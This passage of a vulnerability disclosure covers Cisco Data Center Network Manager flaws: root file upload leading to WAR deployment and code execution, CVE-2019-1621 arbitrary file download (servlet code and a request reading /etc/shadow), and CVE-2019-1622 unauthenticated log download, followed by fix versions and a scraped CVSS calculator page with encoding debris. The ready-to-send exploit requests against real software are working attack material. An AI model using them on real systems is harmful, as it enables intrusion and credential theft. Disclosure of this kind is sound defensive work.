write it to any new file in any directory as root.

If we send the following request:
POST /fm/fileUpload HTTP/1.1
Host: 10.75.1.40
Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;
Content-Length: 429
Content-Type: multipart/form-data;

Content-Disposition: form-data; name="filePath"; filename="whatever"
Content-Type: application/octet-stream

<any text or binary content here>

The server will respond with:
HTTP/1.1 200 OK

<file id="whatever">File successfully written to server at 09.02.18

</response>

And our file has been written as root on the server:
[root@dcnm_vm ~]# ls -l /tmp/
(...)
-rw-r--r--  1 root          root               16 Sep  2 17:57 owned
(...)

Finally if we write a WAR file to the JBoss deployment directory, and
the server will deploy the WAR file as root, allowing the attacker to
achieve remote code execution.

A Metasploit module that exploits this vulnerability has been released
with this advisory.

#3
Vulnerability: Arbitrary File Download
CVE-2019-1621
Attack Vector: Remote
Constraints: Authentication to the web interface as an unprivileged user
required EXCEPT for version 11.1(1), where it can be exploited by an
unauthenticated user
Affected products / versions:
- Cisco Data Center Network Manager 11.1(1) and below

DCNM exposes a servlet to download files on /fm/downloadServlet. An
authenticated user can abuse this servlet to download arbitrary files as
root [5].

The code below shows the servlet request processing code:
com.cisco.dcbu.web.client.util.DownloadServlet

        public void service(HttpServletRequest request, HttpServletResponse
response) throws ServletException, IOException {
                Credentials cred =
(Credentials)((Object)request.getSession().getAttribute("credentials"));
                if (cred == null || !cred.isAuthenticated()) {
                        throw new ServletException("User not logged in or Session timed out.");
                }
                String showFile = (String)request.getAttribute("showFile");
                if (showFile == null) {
                        showFile = request.getParameter("showFile");
                }
                File f = new File(showFile);
                if (showFile.endsWith(".cert")) {
                        response.setContentType("application/octet-stream");
                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment;
filename=fmserver.cert;");
                } else if (showFile.endsWith(".msi")) {
                        response.setContentType("application/x-msi");
                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment; filename=" +
f.getName() + ";");
                } else if (showFile.endsWith(".xls")) {
                        response.setContentType("application/vnd.ms-excel");
                        response.setHeader("Pragma", "cache");
                        response.setHeader("Cache-Control", "cache");
                        response.setHeader("Content-Disposition", "attachment; filename=" +
f.getName() + ";");
                }
                ServletOutputStream os = response.getOutputStream();
                FileInputStream is = new FileInputStream(f);
                byte[] buffer = new byte[4096];
                int read = 0;
                try {
                        while ((read = is.read(buffer)) > 0) {
                                os.write(buffer, 0, read);
                        }
                        os.flush();
                }
                catch (Exception e) {
                        LogService.log(LogService._WARNING, e.getMessage());
                }
                finally {
                        is.close();
                }
        }
}

As you can see, it's quite simple. It takes a "showFile" request
parameter, reads that file and returns to the user. Here's an example of
the servlet in action:

Request:
GET /fm/downloadServlet?showFile=/etc/shadow HTTP/1.1
Host: 10.75.1.40
Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;

Response:
HTTP/1.1 200 OK

root:$1$(REDACTED).:17763:0:99999:7:::
bin:*:15980:0:99999:7:::
daemon:*:15980:0:99999:7:::
adm:*:15980:0:99999:7:::
lp:*:15980:0:99999:7:::
(...)

An interesting file to download is
/usr/local/cisco/dcm/fm/conf/server.properties, which contains the
database credentials as well as the sftp root password, both encrypted
with a key that is hardcoded in the source code.

A Metasploit module that exploits this vulnerability has been released
with this advisory.

#4
Vulnerability: Information Disclosure (log files download)
CVE-2019-1622
Attack Vector: Remote
Constraints: None
Affected products / versions:
- Cisco Data Center Network Manager 11.1(1) and below

DCNM exposes a LogZipperServlet in /fm/log/fmlogs.zip. This servlet can
be accessed by an unauthenticated attacker, and it will return all the
log files in /usr/local/cisco/dcm/fm/logs/* in ZIP format, which provide
information about local directories, software versions, authentication
errors, detailed stack traces, etc [6].

To access it, simply request:
GET /fm/log/fmlogs.zip

Code is not shown here for brevity, but the implementation class is
com.cisco.dcbu.web.client.admin.LogZipperServlet.

```
> > ```
> > Fix:
> >
> > ```

```
For #1, upgrade to DCNM 11.0(1) and above [3].
For #2 and #3, upgrade to DCNM 11.2(1) and above [4] [5].
For #4, it is not clear from Cisco's advisory on which version it was
fixed [6].

| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.0 |
| Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV:Â Local AV:Â Adjacent AV:Â Network AV:Â Physical  Select Attack Vector Parameters  Attack Complexity AC:Â Low AC:Â High  Select Attack Complexity Parameters  Privileges Required PR:Â None PR:Â Low PR:Â High  Select Privileges Required Parameters  User Interaction UI:Â Required UI:Â None  Select User Interaction Parameters  Scope S:Â Unchanged S:Â Changed  Select Scope Parameters  Confidentiality Impact C:Â None C:Â Low C:Â High  Select Confidentiality Impact Parameters  Integrity Impact I:Â None I:Â Low I:Â High  Select Integrity Impact Parameters  Availability Impact A:Â None A:Â Low A:Â High  Select Availability Impact Parameters    Base Score: 5.3 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E:Â Unproven  E:Â Proof-of-Concept  E:Â Functional  E:Â High  E:Â Not Defined   Select Exploit Code Maturity Parameters  Remediation Level RL:Â Official-Fix  RL:Â Temporary-Fix  RL:Â Workaround  RL:Â Unavailable  RL:Â Not Defined   Select Remediation Level Parameters  Report Confidence RC:Â Unknown  RC:Â Reasonable  RC:Â Confirmed  RC:Â Not Defined   Select Report Confidence Parameters     Temporal Score: 5.3 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR:Â Low  CR:Â Medium  CR:Â Not Defined  CR:Â High   Select Confidentiality Requirement Parameters  Integrity Requirement IR:Â Low  IR:Â Medium  IR:Â Not Defined  IR:Â High   Select Integrity Requirement Parameters  Availability Requirement AR:Â Low  AR:Â Medium  AR:Â Not Defined  AR:Â High   Select Availability Requirement Parameters  Modified Attack Vector MAV:Â Local  MAV:Â Adjacent  MAV:Â Network  MAV:Â Physical  MAV:Â Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC:Â Low  MAC:Â High  MAC:Â Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR:Â None  MPR:Â Low  MPR:Â High  MPR:Â Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI:Â Required  MUI:Â None  MUI:Â Not Defined   Select Modified User Interaction Parameters  Modified Scope MS:Â Unchanged  MS:Â Changed  MS:Â Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC:Â None  MC:Â Low  MC:Â High  MC:Â Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI:Â None  MI:Â Low  MI:Â High  MI:Â Not Defined   Select Modified Integrity Parameters  Modified Availability MA:Â None  MA:Â Low  MA:Â High  MA:Â Not Defined   Select Modified Availability Parameters    Environmental Score: 5.3 |
